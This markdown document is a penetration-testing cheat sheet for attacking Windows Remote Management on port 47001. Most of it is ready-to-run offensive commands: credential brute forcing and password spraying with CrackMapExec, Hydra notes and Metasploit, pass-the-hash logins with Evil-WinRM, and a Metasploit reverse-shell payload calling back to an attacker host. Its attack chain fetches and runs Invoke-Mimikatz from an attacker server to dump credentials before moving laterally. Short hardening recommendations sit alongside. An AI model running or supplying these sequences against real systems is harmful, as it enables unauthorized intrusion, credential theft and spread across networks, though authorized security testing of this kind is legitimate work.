# WINRM ALTERNATIVE PORT (Port 47001/TCP)

## SERVICE OVERVIEW
```
WinRM on alternative port 47001/TCP
- Windows Remote Management alternative port
- Standard ports: 5985 (HTTP), 5986 (HTTPS)
- Port 47001 sometimes used in specific configurations
- Same protocol and exploitation techniques as 5985/5986
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p47001 <IP>                           # Service/Version detection
nc -nv <IP> 47001                               # Manual connection
curl http://<IP>:47001/wsman                    # Check WinRM endpoint
curl -i http://<IP>:47001/wsman                 # Full HTTP headers
```

## NMAP ENUMERATION
```bash
# WinRM detection on port 47001
nmap -sV -p47001 <IP>                           # Version detection
nmap -p47001 --script http-* <IP>               # HTTP scripts
nmap -p47001 --script http-auth <IP>            # Authentication methods

# Comprehensive WinRM scan (all ports)
nmap -sV -p5985,5986,47001 --script "http-*" <IP> -oA winrm_scan
```

## VERIFY WINRM SERVICE
```bash
# Test if WinRM is running on 47001
curl http://<IP>:47001/wsman
# Response should contain "wsmv.xsd" if WinRM is enabled

# PowerShell test (from Windows)
Test-WSMan -ComputerName <IP> -Port 47001

# Evil-WinRM connection test
evil-winrm -i <IP> -P 47001 -u <USER> -p <PASSWORD>
```

## EVIL-WINRM CONNECTION
```bash
# Connect with Evil-WinRM on port 47001
evil-winrm -i <IP> -u <USER> -p <PASSWORD> -P 47001

# Connect with NTLM hash (pass-the-hash)
evil-winrm -i <IP> -u <USER> -H <NTLM_HASH> -P 47001

# Connect via HTTPS (if SSL is configured)
evil-winrm -i <IP> -u <USER> -p <PASSWORD> -P 47001 -S

# Examples:
evil-winrm -i <IP> -u administrator -p 'Password123!' -P 47001
evil-winrm -i <IP> -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' -P 47001
```

## CRACKMAPEXEC
```bash
# CrackMapExec with custom port
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> -d <DOMAIN> --port 47001

# Examples:
crackmapexec winrm <IP> -u administrator -p 'Password123!' --port 47001
crackmapexec winrm <IP> -u users.txt -p passwords.txt --port 47001
crackmapexec winrm <IP> -u <USER> -H <NTLM_HASH> --port 47001

# Execute commands
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> --port 47001 -x whoami
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> --port 47001 -X 'Get-Process'
```

## BRUTE FORCE ATTACKS
```bash
# CrackMapExec password spray
crackmapexec winrm <IP> -u users.txt -p 'Password123!' --port 47001 --continue-on-success

# Hydra (limited support for custom WinRM ports)
# Note: Hydra's winrm module may not support custom ports easily

# Metasploit
msfconsole
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <IP>
set RPORT 47001
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## AUTHENTICATION TESTING
```bash
# Test common credentials on port 47001
evil-winrm -i <IP> -u administrator -p '' -P 47001
evil-winrm -i <IP> -u administrator -p 'password' -P 47001
evil-winrm -i <IP> -u administrator -p 'Password123!' -P 47001
evil-winrm -i <IP> -u administrator -p 'P@ssw0rd' -P 47001

# Test with domain credentials
evil-winrm -i <IP> -u 'DOMAIN\user' -p 'password' -P 47001
```

## POWERSHELL REMOTING
```bash
# From Windows machine, connect to WinRM on port 47001

# Configure WinRM to use custom port
$sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck
$session = New-PSSession -ComputerName <IP> -Port 47001 -Credential (Get-Credential) -SessionOption $sessionOption

# Enter remote session
Enter-PSSession -Session $session

# Execute commands
Invoke-Command -Session $session -ScriptBlock { whoami }
Invoke-Command -Session $session -ScriptBlock { Get-Process }

# Close session
Remove-PSSession -Session $session
```

## METASPLOIT MODULES
```bash
msfconsole

# WinRM login scanner
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <IP>
set RPORT 47001
set USERNAME administrator
set PASSWORD password
run

# WinRM command execution
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS <IP>
set RPORT 47001
set USERNAME <USER>
set PASSWORD <PASSWORD>
set CMD whoami
run

# WinRM script execution
use exploit/windows/winrm/winrm_script_exec
set RHOSTS <IP>
set RPORT 47001
set USERNAME <USER>
set PASSWORD <PASSWORD>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_IP>
exploit
```

## COMMON MISCONFIGURATIONS
```
☐ WinRM running on non-standard port (weak obscurity)
☐ No firewall rules restricting access to port 47001
☐ Default/weak credentials (administrator:password)
☐ HTTP used instead of HTTPS (credentials in plaintext)
☐ No account lockout policy (unlimited brute force)
☐ WinRM accessible from external networks
☐ Basic authentication enabled over HTTP (very insecure)
☐ No monitoring of WinRM activity
```

## QUICK WIN CHECKLIST
```
☐ Check if WinRM is accessible on port 47001
☐ Test default credentials (administrator:<blank>, etc.)
☐ Brute force with common passwords
☐ Test pass-the-hash (if you have NTLM hashes)
☐ Connect with Evil-WinRM on port 47001
☐ Enumerate system (whoami, systeminfo, etc.)
☐ Check for privilege escalation vectors
☐ Dump SAM/LSA secrets if admin access
☐ Lateral movement to other systems
```

## ONE-LINER ENUMERATION
```bash
# Quick WinRM test on port 47001
curl http://<IP>:47001/wsman

# Test connection with Evil-WinRM
evil-winrm -i <IP> -u administrator -p 'password' -P 47001

# CrackMapExec quick test
crackmapexec winrm <IP> -u administrator -p 'password' --port 47001
```

## SECURITY IMPLICATIONS
```
RISKS:
- Same risks as standard WinRM (5985/5986)
- Running on non-standard port doesn't improve security
- Security through obscurity is ineffective
- Plaintext credentials if HTTP is used
- Pass-the-hash attacks possible
- Full system access if admin credentials obtained

RECOMMENDATIONS:
- Use standard WinRM ports (easier to manage/monitor)
- Use HTTPS (port 5986 or 47001 with SSL)
- Disable HTTP WinRM (port 5985)
- Enforce strong authentication
- Implement account lockout policy
- Restrict access to trusted networks only
- Use certificate-based authentication
- Monitor WinRM access logs
- Disable WinRM if not needed
- Implement network segmentation
```

## PORT 47001 SPECIFICS
```
Why port 47001?
- Sometimes used in Windows Server configurations
- May be result of custom WinRM setup
- Could be port forwarding/NAT configuration
- Possibly result of misconfiguration

Detection:
- Harder to detect than standard 5985/5986
- Security scanners may miss non-standard ports
- Port scan entire range to discover

Recommendation:
- Use standard ports (5985/5986) for better visibility
- Non-standard ports create false sense of security
- Easier to miss in security audits
```

## REFERENCE STANDARD WINRM
```bash
# For detailed WinRM enumeration, see:
# SERVICE ENUM/5985 WinRM.md

# All techniques for 5985/5986 apply to 47001
# Simply specify the port:
# -P 47001 (Evil-WinRM)
# --port 47001 (CrackMapExec)
# set RPORT 47001 (Metasploit)
```

## TOOLS
```bash
# Evil-WinRM
evil-winrm -i <IP> -u <USER> -p <PASSWORD> -P 47001

# CrackMapExec
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> --port 47001

# Metasploit
use auxiliary/scanner/winrm/winrm_login
set RPORT 47001

# curl
curl http://<IP>:47001/wsman

# PowerShell (Windows)
New-PSSession -ComputerName <IP> -Port 47001 -Credential (Get-Credential)
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain:

# 1. Discover WinRM on port 47001
nmap -p47001 --open <subnet>

# 2. Test default credentials
evil-winrm -i <IP> -u administrator -p '' -P 47001

# 3. Password spray
crackmapexec winrm <IP> -u users.txt -p 'Password123!' --port 47001

# 4. Connect with valid credentials
evil-winrm -i <IP> -u administrator -p 'cracked_password' -P 47001

# 5. Enumerate system
*Evil-WinRM* PS C:\> whoami
*Evil-WinRM* PS C:\> systeminfo
*Evil-WinRM* PS C:\> net user

# 6. Dump credentials (if admin)
*Evil-WinRM* PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/Invoke-Mimikatz.ps1')
*Evil-WinRM* PS C:\> Invoke-Mimikatz -DumpCreds

# 7. Lateral movement
crackmapexec winrm <subnet> -u administrator -p 'cracked_password' --port 47001
```
